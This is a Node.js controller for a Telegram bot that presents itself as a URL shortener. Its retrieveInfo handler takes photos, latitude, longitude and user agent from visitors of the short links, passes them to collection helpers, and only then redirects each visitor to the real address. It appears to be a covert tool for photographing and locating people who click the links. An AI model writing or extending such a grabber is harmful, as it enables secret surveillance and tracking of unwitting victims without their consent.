const Url = require("../models/url.model.js");
const path = require("path");
const { sendMessage } = require("../services/bot.services.js");
const { shortenUrl } = require("../services/url.services.js");

const handleMessage = async (req, res) => {
    const body = req.body;
    const message = body.message.text;
    if (message.startsWith("/")) {
        const command = message.split(" ")[0].substring(1);
        if (command === "start") {
            sendMessage(body.message.chat.id, "Welcome to the URL Shortener Bot! Send me a URL to shorten it.");
        } else if (command === "help") {
            sendMessage(body.message.chat.id, "Send me a URL to shorten it. I will return a shortened version.");
        } else {
            sendMessage(body.message.chat.id, "Unknown command. Type /help for assistance.");
        }
    } else {
        const actualUrl = body.message.text;
        const userId = body.message.chat.id;
        try {
            new URL(actualUrl);
            await shortenUrl(req, res);
        } catch (e) {
            return sendMessage(userId, "❌ Please provide a valid URL.");
        }
    }
}

const accessUrl = async (req, res) => {
    res.sendFile(path.join(__dirname, "../views/index.html"));
};

const retrieveInfo = async (req, res) => {
    const { photos, lat, long, userAgent, code } = req.body;

    await retreiveUserBasicInfo(req, code);
    await retreiveLocation(req, lat, long, userAgent, code);
    await retreivePhotos(photos, code, userAgent);

    const urlRecord = await Url.findOne({ newUrl: code });
    res.status(200).json({ redirectTo: urlRecord.actualUrl });
}

module.exports = { handleMessage, accessUrl, retrieveInfo};
